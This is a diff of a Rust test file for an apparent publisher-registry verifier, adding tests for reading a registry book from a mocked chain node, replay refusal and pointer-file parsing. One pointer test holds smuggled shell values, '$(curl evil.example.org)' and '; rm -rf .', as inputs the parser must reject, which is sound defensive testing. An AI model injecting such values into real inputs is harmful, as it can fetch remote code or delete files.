@@ -6,17 +6,17 @@ use crate::{build_cmd, keygen, keys_doc, parse_opts, sign_cmd};
 use onyx_fetch::fixture::{FixedResolver, FixtureServer, LoopbackDial, Reply};
 use std::sync::Arc;
 
-const ID: &str = "river-levels.open";
-const ORIGIN: &str = "data.example.org/river-levels";
-const CHAIN: &str = "84532";
-const BOOK: &str = "0xb0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0";
-const T0: u64 = 1_794_873_600;
+pub(crate) const ID: &str = "river-levels.open";
+pub(crate) const ORIGIN: &str = "data.example.org/river-levels";
+pub(crate) const CHAIN: &str = "84532";
+pub(crate) const BOOK: &str = "0xb0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0";
+pub(crate) const T0: u64 = 1_794_873_600;
 
-fn opts(a: &[&str]) -> Opts {
+pub(crate) fn opts(a: &[&str]) -> Opts {
     parse_opts(&a.iter().map(|s| s.to_string()).collect::<Vec<_>>()).expect("opts")
 }
 
-fn block<F: std::future::Future>(f: F) -> F::Output {
+pub(crate) fn block<F: std::future::Future>(f: F) -> F::Output {
     tokio::runtime::Builder::new_current_thread()
         .enable_all()
         .build()
@@ -25,7 +25,7 @@ fn block<F: std::future::Future>(f: F) -> F::Output {
 }
 
 /// A publisher's working folder under the temp dir.
-struct Folder(PathBuf);
+pub(crate) struct Folder(pub(crate) PathBuf);
 
 /// The folder holds generated key files: it goes when the test ends, also
 /// a failed one (review APPLY-R1 L5).
@@ -42,7 +42,7 @@ impl Folder {
         std::fs::create_dir_all(&d).expect("dir");
         Folder(d)
     }
-    fn p(&self, rel: &str) -> String {
+    pub(crate) fn p(&self, rel: &str) -> String {
         self.0.join(rel).display().to_string()
     }
     fn keygen(&self, name: &str) {
@@ -53,7 +53,7 @@ impl Folder {
         let t = std::fs::read_to_string(self.p(name)).expect("key");
         t.trim().trim_start_matches("0x").to_string()
     }
-    fn address(&self, name: &str) -> String {
+    pub(crate) fn address(&self, name: &str) -> String {
         hx(&address_of(&read_key(&self.p(name)).expect("key")).expect("address"))
     }
     fn keys_doc(&self, key: &str) {
@@ -84,7 +84,7 @@ impl Folder {
     }
     /// A book with one unrelated key, and an empty record folder: what a
     /// reviewer hands in when nothing stands against the application.
-    fn lists(&self) -> (String, String) {
+    pub(crate) fn lists(&self) -> (String, String) {
         let reg = self.write_json(
             "book.json",
             &json!([{"publisher": "lake-levels.open", "origin": "lakes.example.net",
@@ -177,7 +177,7 @@ impl Folder {
         apply(&opts(&a))
     }
     /// Keys, keys document, a signed sample and the application.
-    fn complete(name: &str) -> Folder {
+    pub(crate) fn complete(name: &str) -> Folder {
         let f = Folder::new(name);
         f.keygen("publisher.key");
         f.keygen("spare.key");
@@ -222,7 +222,7 @@ impl Folder {
         let (text, good) = doctor_text(&lines);
         (text, good, lines)
     }
-    fn write_json(&self, rel: &str, v: &Value) -> String {
+    pub(crate) fn write_json(&self, rel: &str, v: &Value) -> String {
         std::fs::write(self.p(rel), v.to_string()).expect("write");
         self.p(rel)
     }
@@ -406,12 +406,12 @@ fn apply_writes_the_application_and_verify_passes_it() {
             "created_unix",
             "data",
             "expires_unix",
-            "keys_document_keccak",
             "origin",
             "publisher",
             "sample",
             "signature",
             "signer",
+            "signers_document_keccak",
             "version"
         ]
     );
@@ -1359,4 +1359,364 @@ fn keys_doc_lists_a_spare_by_its_address() {
     assert!(run(&f.address("publisher.key")).is_err());
     assert!(run(&format!("{spare},{spare}")).is_err());
     assert!(run("spare.key").is_err());
+}
+
+// ------------------------------------------------------------------ slice 3: the book from a chain node
+
+/// A chain node that answers the book's mappings: zero, unless the call's
+/// selector is in `taken`.
+struct BookNode {
+    taken: Vec<&'static str>,
+}
+
+impl JsonRpc for BookNode {
+    fn call<'a>(
+        &'a self,
+        method: &'a str,
+        p: Value,
+    ) -> onyx_api::x402::BoxFuture<'a, Result<Value, String>> {
+        Box::pin(async move {
+            match method {
+                "eth_call" => {
+                    let d = p[0]["data"].as_str().unwrap_or_default();
+                    let hit = self
+                        .taken
+                        .iter()
+                        .any(|sig| d.starts_with(&hx(&keccak256(sig.as_bytes()).0[..4])));
+                    Ok(json!(hx(&[u8::from(hit); 32])))
+                }
+                "eth_getBalance" => Ok(json!("0x0")),
+                "eth_gasPrice" => Ok(json!("0x3b9aca00")),
+                other => Err(format!("unexpected {other}")),
+            }
+        })
+    }
+}
+
+fn chain(taken: Vec<&'static str>, keys: Vec<onyx_api::bulk_registry::BookKey>) -> ChainBook {
+    ChainBook {
+        rpc: Box::new(BookNode { taken }),
+        keys: BookKeys {
+            at: (900, Hash32([0xf1; 32])),
+            from_block: 100,
+            reviewer: [9; 20],
+            keys,
+        },
+    }
+}
+
+#[test]
+fn the_book_is_read_from_the_chain_and_never_from_a_list_beside_it() {
+    let f = Folder::complete("s3-chain");
+    let (site, now) = (f.p("site"), T0.to_string());
+    let (reg, none) = f.lists();
+    let base = [
+        "--chain-id",
+        CHAIN,
+        "--book",
+        BOOK,
+        "--now",
+        &now,
+        "--decisions",
+        &none,
+    ];
+    let rv = |c: ChainBook| {
+        review(&opts(&base))
+            .expect("review")
+            .with_chain(Some(c))
+            .expect("chain")
+    };
+    let src = Source::Dir(PathBuf::from(&site));
+
+    // An empty book read from the chain is a read book: exit 0, not 4.
+    let (report, code) = block(verify(&src, &rv(chain(vec![], vec![]))));
+    assert_eq!(code, 0, "{report:#}");
+    assert_eq!(report["bookRead"]["finalizedBlock"], 900);
+    assert_eq!(report["bookRead"]["fromBlock"], 100);
+    assert_eq!(report["registered"]["count"], 0);
+    assert!(
+        !report["notChecked"].to_string().contains("the book:"),
+        "{report:#}"
+    );
+
+    // The scan started after the book's first key: the book's own mapping
+    // holds the id although no log names it. Nothing is decided.
+    let late = chain(vec!["originOfSource(bytes32)"], vec![]);
+    let (report, code) = block(verify(&src, &rv(late)));
+    assert_eq!(code, 3, "{report:#}");
+    assert_eq!(report["refused"]["check"], "book");
+    assert!(
+        report["refused"]["reason"]
+            .as_str()
+            .is_some_and(|r| r.contains("started after")),
+        "{report:#}"
+    );
+
+    // The id is registered for this origin in the book: a further key
+    // without a cosignature is refused from the chain's list.
+    let held = onyx_api::bulk_registry::BookKey {
+        key: Hash32([1; 32]),
+        publisher: ID.into(),
+        origin: ORIGIN.into(),
+        signer: [0xcc; 20],
+        provenance: Hash32([2; 32]),
+        life: 1,
+        suspended: false,
+        block: 200,
+        tx: Hash32([3; 32]),
+    };
+    let (report, code) = block(verify(&src, &rv(chain(vec![], vec![held.clone()]))));
+    assert_eq!(
+        (code, report["refused"]["code"].as_str()),
+        (1, Some("no-cosignature")),
+        "{report:#}"
+    );
+
+    // An origin the book holds in another form stops the tool.
+    let mut odd = held.clone();
+    odd.origin = "https://Data.example.org/".into();
+    let e = review(&opts(&base))
+        .expect("review")
+        .with_chain(Some(chain(vec![], vec![odd])))
+        .err()
+        .expect("refused");
+    assert!(e.contains("registered form"), "{e}");
+
+    // --rpc and --registered together: refused before anything is read.
+    let mut both = base.to_vec();
+    both.extend(["--rpc", "http://127.0.0.1:1", "--registered", &reg]);
+    let e = block(chain_book(&opts(&both))).err().expect("usage");
+    assert!(e.0 && e.1.contains("never from a file"), "{e:?}");
+    // A public chain needs the book's first block; a local one starts at 0.
+    let net = |chain_id, book: [u8; 20]| Network { chain_id, book };
+    assert!(from_block(&opts(&["--rpc", "x"]), &net(84_532, [0xb0; 20])).is_err());
+    assert_eq!(
+        from_block(&opts(&["--rpc", "x"]), &net(31_337, [0xb0; 20])),
+        Ok(0)
+    );
+    // The test network's book starts at its pinned deploy block, and its
+    // scan is kept between runs; a local chain's is not.
+    let (known, live, deploy) = onyx_api::bulk_registry::KNOWN_BOOKS[0];
+    assert_eq!(
+        from_block(&opts(&["--rpc", "x"]), &net(known, live)),
+        Ok(deploy)
+    );
+    let kept = scan_cache(&opts(&[]), &net(known, live)).expect("a default cache");
+    assert!(
+        kept.ends_with(format!("book-scan/{known}-{}.json", hx(&live))),
+        "{kept:?}"
+    );
+    assert_eq!(scan_cache(&opts(&[]), &net(31_337, [0xb0; 20])), None);
+    assert_eq!(
+        scan_cache(
+            &opts(&["--scan-cache", "/x/y.json"]),
+            &net(31_337, [0xb0; 20])
+        ),
+        Some(PathBuf::from("/x/y.json"))
+    );
+    // A chain node that does not answer decides nothing (never a refusal).
+    let mut dead = base.to_vec();
+    dead.extend(["--rpc", "http://127.0.0.1:1"]);
+    let mut dead_local = dead.clone();
+    dead_local[1] = "31337";
+    let e = block(chain_book(&opts(&dead_local))).err().expect("dead");
+    assert!(!e.0 && e.1.contains("the book was not read"), "{e:?}");
+
+    // The doctor with the chain: the book, the gas line; nothing skipped
+    // but the node, which was not named.
+    let (dir, publishers) = (
+        f.p(""),
+        f.write_json(
+            "publishers.json",
+            &json!({"publishers": [], "applications": []}),
+        ),
+    );
+    let o = opts(&[
+        "--dir",
+        &dir,
+        "--now",
+        &now,
+        "--publishers",
+        &publishers,
+        "--mirror",
+        &site,
+    ]);
+    let c = chain(vec![], vec![]);
+    let lines = block(doctor_with(&o, Some(&src), Some(&c))).expect("doctor");
+    let (text, good) = doctor_text(&lines);
+    assert!(good, "{text}");
+    assert_eq!(state(&lines, "book").0, "ok");
+    let said = |step: &str| {
+        lines
+            .iter()
+            .find(|l| l.step == step)
+            .map_or("", |l| l.text.as_str())
+    };
+    assert!(said("book").contains("finalized block 900"), "{text}");
+    assert_eq!(state(&lines, "gas").0, "ok");
+    assert!(
+        said("gas").contains("none is needed before approval"),
+        "{text}"
+    );
+    assert_eq!(state(&lines, "status").0, "ok");
+    assert_eq!(state(&lines, "node").0, "skipped");
+    assert_eq!(state(&lines, "origin files").0, "ok");
+
+    // The status list names a refused application by its Keccak only.
+    let app = std::fs::read(f.p("site/.well-known/onyx-publisher-application.json")).expect("app");
+    let publishers = f.write_json(
+        "publishers.json",
+        &json!({"publishers": [], "applications": [
+            {"application": keccak256(&app).to_string(), "state": "refused", "reason": "rights-unclear"}]}),
+    );
+    let o = opts(&["--dir", &dir, "--now", &now, "--publishers", &publishers]);
+    let lines = block(doctor(&o, None)).expect("doctor");
+    assert_eq!(state(&lines, "status").0, "problem");
+    let status = lines.iter().find(|l| l.step == "status").expect("status");
+    assert!(status.text.contains("refused rights-unclear"), "{status:?}");
+}
+
+#[test]
+fn a_request_in_the_record_is_not_taken_again() {
+    let f = Folder::complete("s3-sequence");
+    let (k, site, now) = (f.p("publisher.key"), f.p("site"), T0.to_string());
+    request(&opts(&[
+        "--key",
+        &k,
+        "--publisher",
+        ID,
+        "--origin",
+        ORIGIN,
+        "--chain-id",
+        CHAIN,
+        "--book",
+        BOOK,
+        "--site",
+        &site,
+        "--now",
+        &now,
+        "--kind",
+        "withdraw",
+    ]))
+    .expect("request");
+    let records = PathBuf::from(f.p("records"));
+    std::fs::create_dir_all(&records).expect("dir");
+    let check = || {
+        let mut rv = review(&opts(&[
+            "--chain-id",
+            CHAIN,
+            "--book",
+            BOOK,
+            "--now",
+            &now,
+            "--origin",
+            ORIGIN,
+        ]))
+        .expect("review");
+        rv.sequences = Some(crate::record::sequences(&records).expect("sequences"));
+        block(verify_request(&Source::Dir(PathBuf::from(&site)), &rv))
+    };
+    // An empty record is a read record: nothing was taken from this key.
+    let (report, code) = check();
+    assert_eq!(code, 0, "{report:#}");
+    assert_eq!(report["lastSequence"], 0);
+    // Written down, the same request is refused.
+    crate::record::append(
+        &records,
+        "application-0000000000000000",
+        &json!({"state": "withdrawn", "signer": report["signer"], "sequence": report["sequence"]}),
+    )
+    .expect("append");
+    let (report, code) = check();
+    assert_eq!(
+        (code, report["refused"]["code"].as_str()),
+        (1, Some("bad-request")),
+        "{report:#}"
+    );
+    // Another key's sequence does not count against this one.
+    std::fs::remove_dir_all(&records).expect("clear");
+    crate::record::append(
+        &records,
+        "application-0000000000000000",
+        &json!({"state": "withdrawn", "signer": "0x00000000000000000000000000000000000000aa", "sequence": u64::MAX}),
+    )
+    .expect("append");
+    assert_eq!(check().1, 0);
+}
+
+#[test]
+fn a_pointer_is_two_lines_read_from_a_file() {
+    let hash = format!("0x{}", "ab".repeat(32));
+    let good = format!(
+        "<!--\nTwo lines, nothing else.\n-->\n\norigin: {ORIGIN}\napplication keccak: {hash}\n"
+    );
+    assert_eq!(pointer_lines(&good), Ok((ORIGIN.to_string(), hash.clone())));
+    for (bad, why) in [
+        (format!("origin: {ORIGIN}\n"), "no `application keccak:`"),
+        (format!("{good}please hurry\n"), "neither"),
+        (format!("{good}origin: other.example.org\n"), "twice"),
+        (
+            format!("origin: $(curl evil.example.org)\napplication keccak: {hash}\n"),
+            "origin",
+        ),
+        (
+            format!("origin: https://{ORIGIN}\napplication keccak: {hash}\n"),
+            "origin",
+        ),
+        (
+            format!("origin: {ORIGIN}\napplication keccak: {hash}; rm -rf .\n"),
+            "keccak",
+        ),
+        (
+            format!("<!-- open\norigin: {ORIGIN}\napplication keccak: {hash}\n"),
+            "open comment",
+        ),
+        ("x".repeat(5_000), "over 4 KiB"),
+    ] {
+        let e = pointer_lines(&bad).expect_err(why);
+        assert!(e.contains(why), "{why}: {e}");
+    }
+    // The command takes the file in place of --origin and --hash.
+    let f = Folder::complete("s3-pointer");
+    let app = std::fs::read(f.p("site/.well-known/onyx-publisher-application.json")).expect("app");
+    let pointer = f.p("issue.txt");
+    std::fs::write(
+        &pointer,
+        format!(
+            "origin: {ORIGIN}\napplication keccak: {}\n",
+            keccak256(&app)
+        ),
+    )
+    .expect("write");
+    let (site, now) = (f.p("site"), T0.to_string());
+    let o = opts(&[
+        "--dir",
+        &site,
+        "--pointer",
+        &pointer,
+        "--chain-id",
+        CHAIN,
+        "--book",
+        BOOK,
+        "--now",
+        &now,
+    ]);
+    assert_eq!(
+        block(verify_cmd(&o)),
+        Ok(EXIT_UNREAD),
+        "passes what was checked; the book is not read"
+    );
+    let both = opts(&[
+        "--dir",
+        &site,
+        "--pointer",
+        &pointer,
+        "--origin",
+        ORIGIN,
+        "--chain-id",
+        CHAIN,
+        "--book",
+        BOOK,
+    ]);
+    assert!(block(verify_cmd(&both)).is_err());
 }
